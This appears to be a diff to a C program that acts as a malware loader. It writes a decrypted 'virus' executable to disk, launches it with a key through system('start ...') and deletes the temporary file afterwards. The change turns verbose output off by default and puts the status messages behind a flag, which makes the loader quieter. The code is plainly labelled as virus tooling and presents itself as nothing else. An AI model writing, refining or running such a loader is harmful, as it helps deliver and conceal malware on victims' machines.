@@ -6,13 +6,18 @@
  */
 #define MAX_SIZE 200
 
-
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
 #include <process.h>
+#include <windows.h>
+#include <sys/types.h>
+#include <unistd.h>
 
-int verbose = 1;
+
+
+
+int verbose = 0;
 char enc_text[MAX_SIZE];
 char virus_name[MAX_SIZE];
 char key[MAX_SIZE];
@@ -36,11 +41,15 @@ int main(int argc,char* argv[]){
     }
 
 	sprintf(virus_name,"%s:virus.exe",key);
-    printf("------------------------\n");
-    printf("key name  :  %s\n",key);	
-	printf("virus name:  %s\n",virus_name);
-	printf("start ./tmp_dec_virus.exe %s\n",key);
-	system("pause");
+	if(verbose==1){
+		printf("------------------------\n");
+		printf("key name  :  %s\n",key);	
+		printf("virus name:  %s\n",virus_name);
+		printf("start /b ./tmp_dec_virus.exe %s\n",key);
+		printf("------------------------\n");
+		system("pause");
+	}
+	
 
 	
 	
@@ -74,16 +83,24 @@ int main(int argc,char* argv[]){
 	fclose(pFile_enc_virus);
 	
 	char command[MAX_SIZE];
-	
+
 	sprintf(command,"start ./tmp_dec_virus.exe %s",key);
+    system(command);
+    
+	system("del tmp_dec_virus.exe");
+
+
 	
 	
-	//sprintf(command,"start ./virus.exe %s",key);
-	system(command);
+	
+
+		
+
 	
 	
-	sprintf(command,"del tmp_dec_virus.exe");
-	system(command);
+	
+	
+	
 	
 return 0;
 }
